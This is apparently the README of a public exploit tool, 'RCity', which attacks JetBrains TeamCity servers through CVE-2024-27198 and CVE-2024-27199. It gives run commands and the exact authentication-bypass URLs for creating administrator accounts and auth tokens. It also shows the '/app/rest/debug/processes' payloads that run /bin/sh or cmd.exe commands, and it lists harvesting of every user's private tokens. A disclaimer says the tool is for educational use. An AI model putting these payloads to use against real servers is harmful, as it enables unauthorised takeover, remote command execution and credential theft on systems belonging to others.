# RCity - CVE-2024-27198 (RCE & Admin Account Creation) & CVE-2024-27199 (Auth Bypass)
<b>Exploiting CVE-2024-27198 & CVE-2024-27199</b>

RCity is a Python script that interacts with a vulnerable TeamCity server. The CVE facilitates for unauthorised admin account creation, bypassing 403's on the domain. Whilst also achieving RCE, through the Debug/Processes route.

## Usage

To use the script, you need to provide the target TeamCity server URL as a command-line argument with the `-t` or `--target` argument: 

```bash
python3 RCity.py -t http://teamcity.com:8111
```

You can increase output verbosity with the `-v` or `--verbose` option:

```bash
python3 RCity.py -t http://teamcity.com:8111 --verbose
```

You can send one shot commands directly through `-c` or `--command` option, <b>if you want an interactive shell DO NOT use this option. </b>It is not friendly with reverse shells, as connection closes after cmd is sent:

```bash
python3 RCity.py -t http://teamcity.com:8111 -c id
```

You can ensure no POST requests are sent to the TeamCity server by using the `-s` or `--stealth` option.


```bash
python3 RCity.py -t http://teamcity.com:8111 -s
```

Disables RCE function - Everything else remains the same


```bash
python3 RCity.py -t http://teamcity.com:8111 --no-rce
```

Prevents user list from being gathered, can be time consuming on larger user lists. Skip straight to RCE with this!


```bash
python3 RCity.py -t http://teamcity.com:8111 --no-enum
```


## Features

- Admin Account Creation

- Remote Code Execution

- Generating Authorisation Tokens

- Enumerating Users

- Gatherin all Private Auth Tokens of Users

- Gathering Server Details

## Example

![image](https://github.com/Stuub/RCity-CVE-2024-27198/assets/60468836/41175f68-6051-4286-b0ab-5bac3ebab3b7)


# RCE

![image](https://github.com/Stuub/RCity-CVE-2024-27198/assets/60468836/f6279e56-1b95-4295-9b04-8ccf825a03bd)

# Token Generation


![image](https://github.com/Stuub/RCity-CVE-2024-27198/assets/60468836/a6377923-ebdc-4119-bb70-f4dcbadac084)


# Documentation

Here I'll go through the functions used in this project, to hopefully give you a better comprehension behind this exploit and the vulnerbailities associated with it.  

## Background

The nature of the vulnerability correlates between both CVE-2024-27198 & 99 due to the nature of the issue being produced from the same authentication bypass for REST API routes within JetBrains TeamCity servers. However, the impact of said vulnerability is where it interchanges, and gets interesting... CVE-2024-27198 being the real heavy hitter on paper, due to it's disclosed RCE impact, leverages the `/app/rest/debug/processes` endpoint, <b> ONLY </b> with the permissions to make the necessary requests to this endpoint, via an Auth Token. This call to this endpoint differs between Unix and Windows hosts, however is manipulated similarly, the only difference being the native shell that is provoked for a request. 

Linux - `processes?exePath=/bin/sh&params=-c&params={yourRCE_HTMLEncoded}`

Windows - `processes?exePath=cmd.exe&params=/c&params={yourRCE_HTMLEncoded}`

## Auth Bypass

Now, as mentioned prior - this isn't possible without authentication, should be safe... right? That's where the Auth Bypass comes in.

Bypassing the policy of the TeamCity build opens up the oppurtunity to make requests against the server and drop our Auth Token in there, without even technically needing our own account.

The bypass itself, is creating an alternative path to REST routes, that without going into too much detail, necessitates the control of contents in a class that's job is to handle requests, specifically those that aren't 302 (redirects), which then allows us to control it by appending 3 necessary parts into our URL.

1. An unauthenticated endpoint that will not trigger a 302, in our case `/hax`

2. A URL query parameter named `jsp` to query the API Routes, for examples sake, the `users` path `?jsp=/app/rest/users`

3. An arbitrary URI path ends with .jsp. This can be achieved by appending an HTTP path parameter segment `;.jsp`

Meaning the final payload for making unauthorised requests to the users endpoint is: `/hax?jsp=/app/rest/users;.jsp`

Now we can make requests against the users endpoint and add our own users, even Administrators!

However, before we can go to RCE, we need an Auth token, as the bearer for our RCE requests against their REST API. No issue now we have our bypass, we'll go make one!

## REST API Token Generation --> RCE

The token endpoint was following the same path tree as the previous example, it can be found at `/app/rest/users/id:{user_id}/tokens/{token_name}`. So let's craft another payload to bypass auth and create a token!

<i>(We supply our own token name for this, for this script it is a random generation of alphanumeric ascii characters).</i>

`/hax?jsp=/app/rest/users/id:{user_id}/tokens/{token_name};.jsp`

After making our POST request to add our token into our newly created user, we can now start making requests against the `/app/rest/debug/processes` route!

Nothing special about the crafting of our RCE payloads, just HTML encode your payloads in the params argument!

##

<b>Happy hacking!</b>

## References

https://www.rapid7.com/blog/post/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-authentication-bypass-vulnerabilities-fixed/

https://nvd.nist.gov/vuln/detail/CVE-2024-27198

https://github.com/W01fh4cker/CVE-2024-27198-RCE

## Disclaimer

This script is for educational purposes only. Use it responsibly and only on systems you have permission to access.
